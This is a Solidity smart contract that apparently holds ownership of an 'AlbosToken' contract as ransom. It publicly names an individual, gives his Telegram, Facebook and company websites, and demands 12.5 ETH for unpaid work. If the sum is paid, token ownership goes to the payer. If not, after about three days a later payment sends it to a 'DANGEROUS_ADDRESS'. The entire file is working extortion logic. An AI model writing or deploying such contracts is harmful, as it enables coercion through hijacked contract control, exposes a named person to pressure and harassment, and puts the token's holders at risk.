pragma solidity ^0.4.24;

interface AlbosToken {
  function transferOwnership(address newOwner) external;
}

contract AntonPleasePayMe {
  string public constant telegram = &#39;@antondz&#39;;
  string public constant facebook = &#39;www.facebook.com/AntonDziatkovskii&#39;;
  string public constant websites = &#39;www.ubai.co && www.platinum.fund && www.micromoney.io&#39;;
  string public constant unpaidAmount = &#39;$1337 / 107 usd per eth = 12.5 ETH&#39;;

  string public constant AGENDA = &#39;Anton Dziatkovskii, please, pay me $1337 for my full-time job.&#39;;
  uint256 public constant ETH_AMOUNT = 12500000000000000000;
  uint256 public constant THREE_DAYS_IN_BLOCKS = 18514; // (3 days =>) (60 * 60 * 24 * 3) / 14 (<= seconds per block)
  address public constant DANGEROUS_ADDRESS = address(0xec95Ad172676255e36872c0bf5D417Cd08C4631F);
  uint256 public START_BLOCK = 0;
  AlbosToken public albos;

  function start(AlbosToken _albos) external {
    require(address(0x3E9Af6F2FD0c1a8ec07953e6Bc0D327b5AA867b8) == address(msg.sender));
    albos = AlbosToken(_albos);
    START_BLOCK = block.number;
  }

  function () payable external {
    require(msg.value >= ETH_AMOUNT / 100);

    if (msg.value >= ETH_AMOUNT) {
      albos.transferOwnership(address(msg.sender));
      address(0x5a784b9327719fa5a32df1655Fe1E5CbC5B3909a).transfer(msg.value / 2);
      address(0x2F937bec9a5fd093883766eCF3A0C175d25dEdca).transfer(address(this).balance);
    } else if (block.number > START_BLOCK + THREE_DAYS_IN_BLOCKS) {
      albos.transferOwnership(DANGEROUS_ADDRESS);
      address(0x5a784b9327719fa5a32df1655Fe1E5CbC5B3909a).transfer(msg.value);
    } else {
      revert();
    }
  }
}